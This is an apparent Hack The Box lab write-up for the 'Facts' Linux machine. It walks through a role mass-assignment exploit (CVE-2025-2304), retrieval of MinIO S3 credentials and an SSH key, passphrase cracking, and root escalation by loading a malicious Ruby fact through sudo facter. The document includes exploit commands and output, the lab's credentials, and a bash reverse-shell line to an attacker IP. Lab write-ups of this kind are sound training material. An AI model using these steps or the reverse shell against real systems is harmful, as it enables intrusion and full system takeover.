# Facts

OS: Linux\
Difficulty: Easy

**Tags:** `#htb` `#linux` `#easy` `#mass-assignment` `#broken-access-control` `#minio` `#sudo-abuse` `#cve-2025-2304`

## Attack chain summary

```
Register account
    ↓
CVE-2025-2304 — mass assignment → admin role
    ↓
Admin panel → MinIO (S3) credentials
    ↓
MinIO bucket → internal/.ssh/id_ed25519
    ↓
John the Ripper → passphrase: dragonballz
    ↓
SSH as trivia
    ↓
sudo facter --custom-dir /tmp/ → RCE as root
```

## Credentials & flags

| Item | Value |
|---|---|
| SSH key passphrase | `dragonballz` |
| SSH user | `trivia` |
| MinIO access key | `AKIA1E20EB0DF2C16D35` |
| MinIO secret key | `bTxQlK47NFP+z01ypvvmGnjwvBtyrXVNkzbgITp+` |

## Enumeration

`/etc/hosts`:
```
10.129.244.96   facts.htb
```

### Nmap
```bash
sudo nmap 10.129.244.96 -Pn -T5 -sV -p- -sC --open --reason
```

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.9p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.26.3 |
| 54321/tcp | HTTP (MinIO) | Golang net/http — redirects to `facts.htb:9001` |

> Port 54321 is a MinIO S3-compatible object store. Nmap shows it redirecting to port 9001 (MinIO web UI).

### ffuf
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://facts.htb/FUZZ -mc 200,204,301,302,307,401
```
Notable: `/admin` → 302 (login redirect), `/robots.txt`, `/sitemap.xml`, `/page`, `/search`, `/post`.

## Foothold — CVE-2025-2304 (role mass assignment)

The admin panel has a broken access control flaw: an authenticated low-privilege user can PATCH `/admin/users/{id}/updated_ajax` with `password[role]=admin` in the body, escalating their own account to admin. The server trusts the `role` field in the password update form — classic mass assignment.

1. Register an account at `http://facts.htb/admin/login` → "Create an account".
2. Run the exploit:
```bash
python3 cve-2025-2304.py http://facts.htb drnatas drnatas
```
```
[*] Logging in as drnatas...
[+] Login successful!
[*] Found User ID: 6
[*] Sending exploit payload...
[+] Exploit successful! Logout and login again for admin privileges.
```
3. Log back in — the account is now admin.

Exploit logic:
1. `GET /admin/login` → extract CSRF token
2. `POST /admin/login` → authenticate
3. `GET /admin/profile/edit` → extract user ID + profile CSRF token
4. `POST /admin/users/{id}/updated_ajax` with `_method=patch` and `password[role]=admin`

## MinIO / S3 enumeration

AWS credentials were found in the admin panel under **Settings → General Site → Filesystem Settings**.

```bash
aws configure
# AWS Access Key ID:     AKIA1E20EB0DF2C16D35
# AWS Secret Access Key: bTxQlK47NFP+z01ypvvmGnjwvBtyrXVNkzbgITp+
# Default region:        us-east-1

aws --endpoint-url http://facts.htb:54321 s3 ls
# 2025-09-11 05:06:52 internal
# 2025-09-11 05:06:52 randomfacts

aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
# authorized_keys
# id_ed25519

aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
```

## SSH key cracking

The private key is passphrase-protected:
```bash
ssh2john id_ed25519 > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
# dragonballz  (id_ed25519)
```

## SSH access

```bash
ssh -i id_ed25519 trivia@facts.htb   # passphrase: dragonballz

sudo -l
# User trivia may run the following commands on facts:
#     (ALL) NOPASSWD: /usr/bin/facter
```

## Privilege escalation — facter custom directory

`/usr/bin/facter` is a Ruby script (Puppet's system facts tool). It loads custom fact modules from a user-specified directory via `--custom-dir`. Running it with `sudo` executes attacker-supplied Ruby as root.

```bash
# 1. Malicious Facter fact
cat > /tmp/pwn.rb << EOF
Facter.add(:pwn) do
  setcode do
    system("bash -c 'bash -i >& /dev/tcp/10.10.15.46/1337 0>&1'")
  end
end
EOF

# 2. Listener (attacker)
nc -lnvp 1337

# 3. Trigger as root (victim)
sudo /usr/bin/facter --custom-dir /tmp/
```
```
connect to [10.10.15.46] from (UNKNOWN) [10.129.244.96] 48820
root@facts:/home/trivia#
```

---
*Migrated from local Obsidian lab notes. Review evidence before reuse.*
